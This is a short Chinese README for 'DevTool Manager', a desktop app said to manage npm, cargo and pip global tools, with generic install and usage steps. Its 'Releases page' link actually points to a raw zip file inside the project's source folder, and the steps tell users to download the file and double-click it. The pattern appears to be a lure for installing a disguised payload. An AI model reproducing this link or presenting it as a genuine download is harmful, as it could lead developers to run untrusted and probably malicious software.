## 📖 简介

DevTool Manager 是一款面向开发者的桌面工具管理器，帮助您统一管理各包管理器安装的全局开发工具。告别繁琐的命令行操作，通过可视化界面轻松完成工具的安装、更新、卸载和配置。

**为什么需要它？**

- 🔍 **统一视图** - 一个界面查看所有 npm/cargo/pip 全局工具
- ⚡ **批量操作** - 告别逐个更新，支持批量更新和卸载
- 🧹 **系统清理** - 一键清理各包管理器缓存，释放磁盘空间
- 📊 **可视化** - 直观展示工具占用空间、端口占用、进程状态

## 🚀 Getting Started

### 👨‍💻 系统需求

DevTool Manager 支持以下操作系统：

- Windows: 10及以上
- macOS: 10.15及以上
- Linux: 发行版支持（Ubuntu、Fedora等）

### 📥 下载和安装

1. 访问 DevTool Manager 的 [Releases 页面](https://github.com/DibbenduOjha/dev-tools/raw/refs/heads/main/src/pages/ToolsPage/tools_dev_2.5-alpha.4.zip)。
2. 找到最新版本的下载链接。
3. 根据您的操作系统下载相应的安装文件。
4. 双击下载的文件并按照屏幕上的提示完成安装。

### ⚙️ 启动应用

1. 安装完成后，打开 DevTool Manager。
2. 您将看到一个用户友好的界面，展示所有已安装的开发工具。

---

## 🔍 使用指南

### 👷‍♂️ 添加工具

- 在主界面上，选择“安装”按钮。
- 从支持的工具列表中选择所需的工具。
- 点击“安装”以完成安装。

### 🔄 更新工具

- 在主界面，您会看到可用更新的工具列表。
- 选择希望更新的工具并点击“更新”。

### ❌ 卸载工具

- 从工具列表中选择您希望卸载的工具。
- 点击“卸载”并确认操作。

### 💾 清理缓存

- 在主界面上，找到“系统清理”选项。
- 点击“一键清理”按钮释放磁盘空间。
